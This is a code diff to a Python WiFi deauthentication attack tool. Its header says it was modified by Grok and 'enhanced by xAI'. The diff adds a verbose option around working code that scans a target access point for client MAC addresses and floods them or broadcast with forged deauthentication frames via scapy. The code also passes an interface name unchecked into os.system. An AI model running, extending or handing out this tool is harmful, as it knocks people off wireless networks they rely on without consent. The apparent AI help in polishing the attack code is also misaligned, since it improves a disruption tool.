@@ -1,7 +1,7 @@
 #!/usr/bin/python3
 #
 #--------------------------------------------------------------------------------------------------------------------------
-# Author: Rofi (Fixploit03), Modified by Grok to use platform module
+# Author: Rofi (Fixploit03), Modified by Grok to use platform module and enhanced by xAI
 # GitHub: https://github.com/fixploit03/deauther
 # Copyright (c) 2025 - Rofi (Fixploit03)
 #--------------------------------------------------------------------------------------------------------------------------
@@ -163,7 +163,7 @@ def create_deauth_packet(bssid, client):
     return pkt
 
 # --- Function Section: Scan for clients connected to an AP ---
-def scan_clients(interface, bssid, channel, timeout=30):
+def scan_clients(interface, bssid, channel, timeout=30, verbose=False):
     """
     Scan for all clients connected to the specified AP, ensuring no duplicate MACs.
 
@@ -172,6 +172,7 @@ def scan_clients(interface, bssid, channel, timeout=30):
         bssid (str): The BSSID of the target access point.
         channel (int): The channel to scan on.
         timeout (int, optional): Duration of the scan in seconds (default: 30).
+        verbose (bool, optional): If True, show each found client during scanning (default: False).
 
     Returns:
         list: A list of unique client MAC addresses found.
@@ -193,8 +194,9 @@ def scan_clients(interface, bssid, channel, timeout=30):
             client_mac = pkt.addr1
             if client_mac not in clients:
                 clients.add(client_mac)
-                time_str = colored(get_current_time(), 'cyan')
-                print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Found client: {client_mac}", 'white'))
+                if verbose:
+                    time_str = colored(get_current_time(), 'cyan')
+                    print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Found client: {client_mac}", 'white'))
     
     time_str = colored(get_current_time(), 'cyan')
     print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Scanning for clients for {timeout} seconds...", 'white'))
@@ -202,9 +204,9 @@ def scan_clients(interface, bssid, channel, timeout=30):
     return list(clients)
 
 # --- Function Section: Send deauthentication packets ---
-def send_deauth_packets(interface, bssid, clients, count, channel, interval=0, is_manual_client=False):
+def send_deauth_packets(interface, bssid, clients, count, channel, interval=0, is_manual_client=False, verbose=False):
     """
-    Send deauthentication packets to detected or specified clients, adjusting message based on client count.
+    Send deauthentication packets to detected or specified clients, adjusting message based on client count and verbose mode.
 
     Args:
         interface (str): The network interface in monitor mode (e.g., wlan0).
@@ -214,6 +216,7 @@ def send_deauth_packets(interface, bssid, clients, count, channel, interval=0, i
         channel (int): The channel to operate on.
         interval (float, optional): Delay between packets in seconds (default: 0).
         is_manual_client (bool, optional): True if client is manually specified via -a (default: False).
+        verbose (bool, optional): If True, show detailed packet information (default: False).
 
     Returns:
         None: Executes the attack and logs progress.
@@ -237,6 +240,8 @@ def send_deauth_packets(interface, bssid, clients, count, channel, interval=0, i
         bssid = validate_mac(bssid)
         os.system(f"iwconfig {interface} channel {channel}")
 
+        packet_sent_logged = False
+
         if count == 0:
             time_str = colored(get_current_time(), 'cyan')
             if len(clients) == 1 and is_manual_client:
@@ -249,10 +254,14 @@ def send_deauth_packets(interface, bssid, clients, count, channel, interval=0, i
                     packet = create_deauth_packet(bssid, client_mac)
                     sendp(packet, iface=interface, verbose=0)
                     time_str = colored(get_current_time(), 'cyan')
-                    if client_mac != "ff:ff:ff:ff:ff:ff":
-                        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Sending packet {packet_number} to {bssid} (CLIENT: {client_mac})", 'white'))
-                    else:
-                        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Sending packet {packet_number} to {bssid} (broadcast mode)", 'white'))
+                    if verbose:
+                        if client_mac != "ff:ff:ff:ff:ff:ff":
+                            print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Sending packet {packet_number} to {bssid} (CLIENT: {client_mac})", 'white'))
+                        else:
+                            print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Sending packet {packet_number} to {bssid} (broadcast mode)", 'white'))
+                    elif not packet_sent_logged:
+                        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Sending packet to {bssid}", 'white'))
+                        packet_sent_logged = True
                     packet_number += 1
                     time.sleep(interval)
         else:
@@ -272,10 +281,14 @@ def send_deauth_packets(interface, bssid, clients, count, channel, interval=0, i
                     packet = create_deauth_packet(bssid, client_mac)
                     sendp(packet, iface=interface, verbose=0)
                     time_str = colored(get_current_time(), 'cyan')
-                    if client_mac != "ff:ff:ff:ff:ff:ff":
-                        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Sending packet {packet_number}/{total_packets} to {bssid} (CLIENT: {client_mac})", 'white'))
-                    else:
-                        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Sending packet {packet_number}/{total_packets} to {bssid} (broadcast mode)", 'white'))
+                    if verbose:
+                        if client_mac != "ff:ff:ff:ff:ff:ff":
+                            print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Sending packet {packet_number}/{total_packets} to {bssid} (CLIENT: {client_mac})", 'white'))
+                        else:
+                            print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Sending packet {packet_number}/{total_packets} to {bssid} (broadcast mode)", 'white'))
+                    elif not packet_sent_logged:
+                        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Sending packet to {bssid}", 'white'))
+                        packet_sent_logged = True
                     packet_number += 1
                     time.sleep(interval)
 
@@ -303,8 +316,7 @@ def main():
         ValueError: Exits if argument validation fails (e.g., invalid MAC).
         Exception: Exits if an unexpected error occurs during execution or if not on Linux.
     """
-    # Check OS using platform module instead of sys.platform
-    os_name = platform.system()  # Returns 'Linux', 'Windows', 'Darwin', etc.
+    os_name = platform.system()
     if os_name != "Linux":
         time_str = colored(get_current_time(), 'cyan')
         print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("ERROR", 'red', attrs=['bold']) + colored("] ", 'white') + colored(f"This program is only supported on Linux! Detected OS: {os_name}", 'white'))
@@ -313,7 +325,6 @@ def main():
     signal.signal(signal.SIGINT, signal_handler)
     check_root()
 
-    # Program description for the help menu
     description = (
         "WiFi Deauthentication Attack Program\n"
         "Author: Rofi (Fixploit03)\n"
@@ -321,37 +332,32 @@ def main():
         "Copyright (c) 2025 Rofi (Fixploit03). All rights reserved."
     )
 
-    # Set up command-line argument parser
     parser = argparse.ArgumentParser(
         description=description,
-        formatter_class=argparse.RawTextHelpFormatter  # Preserve help text formatting
+        formatter_class=argparse.RawTextHelpFormatter
     )
     
-    # Positional argument: Network interface (required)
     parser.add_argument("interface", help="Network interface in monitor mode (e.g., wlan0)")
-    
-    # Optional arguments
     parser.add_argument("-b", "--bssid", required=True, help="BSSID of the target AP (e.g., 00:11:22:33:44:55)")
     parser.add_argument("-c", "--channel", type=int, required=True, help="Channel of the target AP (e.g., 6)")
     parser.add_argument("-a", "--client", help="Client MAC to deauth (e.g., 66:77:88:99:AA:BB). If not specified, scans for clients and deauths all found clients.")
     parser.add_argument("-n", "--count", type=int, default=0, help="Number of packets to send per client. Use 0 for continuous mode (default: 0)")
     parser.add_argument("-t", "--timeout", type=int, default=30, help="Client scan timeout in seconds (default: 30)")
     parser.add_argument("-i", "--interval", type=float, default=0, help="Interval between packet sends in seconds (e.g., 0.1, default: 0)")
+    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
 
     args = parser.parse_args()
 
-    # Verify prerequisites before starting the attack
     check_interface_exists(args.interface)
     check_interface_mode(args.interface)
 
     try:
-        # Determine target clients and start the attack
         if args.client is None:
-            clients = scan_clients(args.interface, args.bssid, args.channel, args.timeout)
-            send_deauth_packets(args.interface, args.bssid, clients, args.count, args.channel, args.interval, is_manual_client=False)
+            clients = scan_clients(args.interface, args.bssid, args.channel, args.timeout, verbose=args.verbose)
+            send_deauth_packets(args.interface, args.bssid, clients, args.count, args.channel, args.interval, is_manual_client=False, verbose=args.verbose)
         else:
             clients = [validate_mac(args.client)]
-            send_deauth_packets(args.interface, args.bssid, clients, args.count, args.channel, args.interval, is_manual_client=True)
+            send_deauth_packets(args.interface, args.bssid, clients, args.count, args.channel, args.interval, is_manual_client=True, verbose=args.verbose)
 
     except ValueError as ve:
         time_str = colored(get_current_time(), 'cyan')
